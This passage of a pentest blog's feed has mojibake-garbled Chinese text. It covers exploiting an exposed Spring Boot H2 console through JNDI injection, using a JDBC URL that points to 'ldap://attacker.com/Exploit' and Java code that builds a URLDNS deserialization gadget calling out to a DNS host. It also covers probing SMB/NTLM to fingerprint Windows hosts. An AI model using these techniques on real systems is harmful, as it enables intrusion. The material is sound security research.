javaæ¢æµ‹classååºåˆ—åŒ–gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget</a></li><li><a href="http://wjlshare.com/archives/1575">ysoserial å·¥å…·æ”¹é€ </a></li><li><a href="https://github.com/phith0n/zkar">zkar</a></li><li><a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDIæ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a></li><li><a href="https://su18.org/post/jdbc-connection-url-attack">jdbc-connection-url-attack</a></li><li><a href="https://github.com/JKme/EvilRMI">https://github.com/JKme/EvilRMI</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-åˆ‡å…¥ç‚¹&quot;&gt;&lt;a href=&quot;#0x1-åˆ‡å…¥ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;0x1. åˆ‡å…¥ç‚¹&quot;&gt;&lt;/a&gt;0x1. åˆ‡å…¥ç‚¹&lt;/h2&gt;&lt;p&gt;åœ¨æ—¥å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œä½¿ç”¨ffufå‘ç°ä¸€ä¸ª&lt;code&gt;/console&lt;/code&gt;çš„æ¥å£ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯H2 Databaseé¡µé¢ï¼š&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/1.png&quot;&gt;&lt;br&gt;å¦‚æœSpring Booté¡¹ç›®ä¸­åŒ…å«h2databaseå¹¶ä¸”åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨h2-consoleï¼Œåˆ™å­˜åœ¨&lt;a href=&quot;https://anquan.baidu.com/article/1078&quot;&gt;JNDIæ³¨å…¥æ¼æ´&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;è®¾ç½®&lt;code&gt;Driver Class&lt;/code&gt;ä¸º&lt;code&gt;javax.naming.InitialContext&lt;/code&gt;ï¼Œ&lt;code&gt;JDBC URL&lt;/code&gt;ä¸º&lt;code&gt;ldap://attacker.com/Exploit&lt;/code&gt;ï¼š&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/2.png&quot;&gt;&lt;br&gt;æ ¹æ®&lt;code&gt;/env&lt;/code&gt;æ³„æ¼çš„ä¿¡æ¯ï¼Œå¾—çŸ¥Javaç‰ˆæœ¬æ˜¯1.8.0_312ï¼Œé«˜ç‰ˆæœ¬JDKä¸­ç”±äºé»˜è®¤codebaseä¸ºtrueä»è€Œå¯¼è‡´å®¢æˆ·ç«¯é»˜è®¤ä¸ä¼šè¯·æ±‚è¿œç¨‹Serverä¸Šçš„æ¶æ„ Class, å› æ­¤ä¸å¯ä»¥ç›´æ¥ä½¿ç”¨LDAPåŠ è½½è¿œç¨‹æ¶æ„ä»£ç ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RMIï¼šJDK 8u113ã€JDK 7u122ã€JDK 6u132 èµ· codebase é»˜è®¤ä¸º true&lt;br&gt;LDAPï¼šJDK 11.0.1ã€JDK 8u191ã€JDK 7u201ã€JDK 6u211 èµ· codebase é»˜è®¤ä¸º true&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x2-ç»•è¿‡å’Œåˆ©ç”¨&quot;&gt;&lt;a href=&quot;#0x2-ç»•è¿‡å’Œåˆ©ç”¨&quot; class=&quot;headerlink&quot; title=&quot;0x2. ç»•è¿‡å’Œåˆ©ç”¨&quot;&gt;&lt;/a&gt;0x2. ç»•è¿‡å’Œåˆ©ç”¨&lt;/h2&gt;&lt;h3 id=&quot;åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡&quot;&gt;&lt;a href=&quot;#åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡&quot; class=&quot;headerlink&quot; title=&quot;åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡&quot;&gt;&lt;/a&gt;åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡&lt;/h3&gt;&lt;p&gt;åˆ©ç”¨URLDNSé“¾å¯ä»¥æ¢æµ‹Javaé»‘ç›’åº”ç”¨é‡Œé¢æŸä¸ªç±»æ˜¯å¦å­˜åœ¨, åœ¨ç‚å­—è¾ˆå’Œc0ny1å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw&quot;&gt;Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA&quot;&gt;æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA&quot;&gt;è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;URLDNSçš„æµ‹è¯•ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®åŒ…&lt;code&gt;1.ser&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;URL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Urldns&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt; hashMap &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;URL&lt;/span&gt; url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;http://333.f9575af1.dns.1433.eu.org&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt; f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hashCode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token comment&quot;&gt;//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);&lt;/span&gt;
          hashMap&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.apache.commons.beanutils.BeanComparator&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt; oos &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;1.ser&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        oos&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;writeObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;hashMap&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;1.ser&quot;));&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ois.readObject();&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt; classPool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDefault&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt; ctClass &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; classPool&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;defrost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>NTLMç«¯å£ä¿¡æ¯æ¢æµ‹</title>
    <link href="https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html"/>
    <id>https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html</id>
    <published>2021-08-05T16:00:00.000Z</published>
    <updated>2022-01-21T03:21:08.062Z</updated>
    
    <content type="html"><![CDATA[<p>SMBï¼ˆServer Message Blockï¼‰åè®®ï¼Œå¯ç”¨äºåœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ç­‰ï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é å®ƒå®ç°çš„ã€‚SMBä½¿ç”¨äº†NetBIOSçš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§°APIï¼‰ã€‚å¦å¤–ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾æ€§çš„åè®®ï¼Œå…è®¸äº†åè®®æ‰©å±•â€”â€”ä½¿å¾—å®ƒå˜å¾—æ›´å¤§è€Œä¸”å¤æ‚ï¼›å¤§çº¦æœ‰65ä¸ªæœ€ä¸Šå±‚çš„ä½œä¸šï¼Œè€Œæ¯ä¸ªä½œä¸šéƒ½è¶…è¿‡120ä¸ªå‡½æ•°ï¼Œç”šè‡³Windows NTä¹Ÿæ²¡æœ‰å…¨éƒ¨æ”¯æŒåˆ°ï¼Œæœ€è¿‘å¾®è½¯åˆæŠŠ SMB æ”¹åä¸º CIFSï¼ˆCommon Internet File Systemï¼‰ï¼Œå¹¶ä¸”åŠ å…¥äº†è®¸å¤šæ–°çš„ç‰¹è‰²ã€‚SMBåè®®ä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445ï¼ŒCIFSåè®®æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼šSMBã€SMB2ã€SMB3ã€‚</p><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>åœ¨type2è¿”å›Challengeçš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶è¿”å›äº†æ“ä½œç³»ç»Ÿç±»å‹ï¼Œä¸»æœºåï¼Œnetbiosåç­‰ç­‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨èƒ½è·ŸæœåŠ¡å™¨è¿›è¡ŒNTLMäº¤æµä¸­ï¼Œç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªtype1çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›type2çš„å“åº”ï¼Œè¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ã€‚SMBv1å’ŒSMBv2çš„æ•°æ®åŒ…ç»“æ„æ˜¯ä¸åŒçš„</p><h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>ä½¿ç”¨<a href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a>æ¢æµ‹SMBæ¥å£ï¼ŒæŠ“åŒ…é€šè¿‡wiresharkåˆ†æï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿç±»å‹çš„æ•°æ®åŒ…ç”±SMB Headerå’ŒResponseç»„æˆï¼š<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–smbæ•°æ®åŒ…çš„NTLMæ•°æ®ï¼Œç„¶åå¯¹NTLMæ•°æ®åŒ…è§£æï¼ŒNTLMæ•°æ®åŒ…ä¸Šä¸€å±‚æ˜¯GSS-APIï¼Œé¦–å…ˆæ‰¾åˆ°GSS-APIåœ¨æ•´ä¸ªæ•°æ®åŒ…çš„åç§»é‡ï¼ŒSMBçš„æ•°æ®åŒ…ç»“æ„é•¿åº¦å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byteWord Count:  1 byteAndXCommand: 1 byteReserved:    1 byteAndXOffset:  2 byteAction:    2 byteSecurity Blob Length: 2 byte (è¡¨ç¤ºSecurity Blobçš„é•¿åº¦ï¼Œè¿™é‡Œçš„hexæ˜¯ 0f 10ï¼Œå°ç«¯è½¬æ¢ä¸º010f,å†è½¬æ¢æˆ10è¿›åˆ¶å°±æ˜¯271ï¼Œå¯¹åº”Security Blobçš„é•¿åº¦)Byte Count: 2 byte (è¡¨ç¤ºSecurity BlobåŠ ä¸ŠNativeOSå’ŒNative Lançš„é•¿åº¦)Security Blob: å¯å˜é•¿åº¦ï¼Œå–å†³äºSecurity Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢çš„æ•°æ®åŒ…ç»“æ„çš„å…³é”®æ•°æ®æ˜¯<code>Security Blob Length</code>å’Œ<code>Byte Content</code>ï¼Œå‰è€…è¡¨ç¤ºGSS-APIçš„æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œåè€…è¡¨ç¤ºGSS-APIå’ŒNative OSåŠ ä¸ŠNative LMçš„æ•°æ®é•¿åº¦ï¼š</p><h6 id="GSS-APIçš„é•¿åº¦æ˜¯271-Byte"><a href="#GSS-APIçš„é•¿åº¦æ˜¯271-Byte" class="headerlink" title="GSS-APIçš„é•¿åº¦æ˜¯271 Byte"></a>GSS-APIçš„é•¿åº¦æ˜¯271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p><h6 id="Native-OSçš„é•¿åº¦æ˜¯42-Byte"><a href="#Native-OSçš„é•¿åº¦æ˜¯42-Byte" class="headerlink" title="Native OSçš„é•¿åº¦æ˜¯42 Byte"></a>Native OSçš„é•¿åº¦æ˜¯42 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.1.png"></p><h6 id="Native-LMçš„é•¿åº¦æ˜¯38-Byte"><a href="#Native-LMçš„é•¿åº¦æ˜¯38-Byte" class="headerlink" title="Native LMçš„é•¿åº¦æ˜¯38 Byte"></a>Native LMçš„é•¿åº¦æ˜¯38 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.2.png"></p><p>æ‰€ä»¥æ•°å­¦é¢˜æ¥äº†ï¼š<br>Security Blob Lengthè½¬æ¢æˆ10è¿›åˆ¶æ˜¯271 Byte</p><p>Byte Count: 271 + 42 + 38 = 351 Byte<br>æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–NTLMçš„æ•°æ®å’ŒNativeOSå’ŒNative LMï¼Œå›åˆ°ä»£ç é‡Œé¢å»çœ‹çœ‹ï¼Œå½“æˆ‘ä»¬è·å–åˆ°type2çš„æ•°æ®ï¼Œè·å–åˆ°çš„æ•°æ®æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-4.png"></p><p>NetBIOS Session Serviceè¿™ä¸€å±‚çš„é•¿åº¦æ˜¯4 Byteï¼Œ<code>Security Blob Length</code>çš„åç§»é‡å°±å‡ºæ¥äº†: </p><pre class="line-numbers language-none"><code class="language-none">4 + 32 + 1 + 1 + 1 + 2 + 2 &#x3D; 43<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥<code>Security Blob Length</code>åç§»ä»43å¼€å§‹ï¼Œé•¿åº¦æ˜¯2 Byteï¼Œ <code>Security Blob</code>è·Ÿåœ¨åé¢ï¼Œåç§»ä»45å¼€å§‹ï¼Œ47ç»“æŸï¼Œgoè¯­è¨€ä¼ªä»£ç ï¼š</p><pre class="line-numbers language-none"><code class="language-none">blob_length :&#x3D; uint16(bytes2Uint(ret[43:45], &#39;&lt;&#39;))blob_count :&#x3D; uint16(bytes2Uint(ret[45:47], &#39;&lt;&#39;))&#x2F;&#x2F;gsså˜é‡è¡¨ç¤ºä»Security Blobèµ·å§‹ä½ç½®åˆ°æ•°æ®åŒ…ç»“æŸï¼ŒåŒ…æ‹¬äº†Native OSå’ŒNative LMgss :&#x3D; ret[47:]&#x2F;&#x2F;æ‰¾åˆ°NTLMSSPåœ¨gssçš„åç§»èµ·å§‹ä½ç½®off_ntlm :&#x3D; bytes.Index(gss, []byte(&quot;NTLMSSP&quot;))&#x2F;&#x2F;Native OSå’ŒNative LMæ•°æ®ï¼Œå¯¹åº”ä¸Šé¢çš„å›¾native :&#x3D; gss[int(blob_length):blob_count]&#x2F;&#x2F;bsè¡¨ç¤ºntlmçš„æ•°æ®ï¼Œä»¥NTLMSSPå¼€å¤´bs :&#x3D; gss[off_ntlm:blob_length]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥ä¸»è¦å·¥ä½œå°±æ˜¯è§£æNTLMçš„æ•°æ®ï¼Œæ„Ÿè°¢iv4nå¸ˆå‚…çš„<a href="http://iv4n.cc/ntlmssp/">Windows NTLMåè®®ç»†èŠ‚</a>ï¼Œæˆ‘forkäº†ä¸€ä»½<a href="https://github.com/JKme/go-ntlmssp">go-ntlmssp</a>ï¼Œå¢åŠ äº†è§£æNTLMè¾“å‡ºå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥è·å–NTLMSSPæ•°æ®çš„è§£æç»“æœï¼š</p><pre class="line-numbers language-none"><code class="language-none">func TestChallengeMsg_String(t *testing.T) &#123;bs, _ :&#x3D; hex.DecodeString(&quot;4e544c4d535350xxxxx&quot;)type2 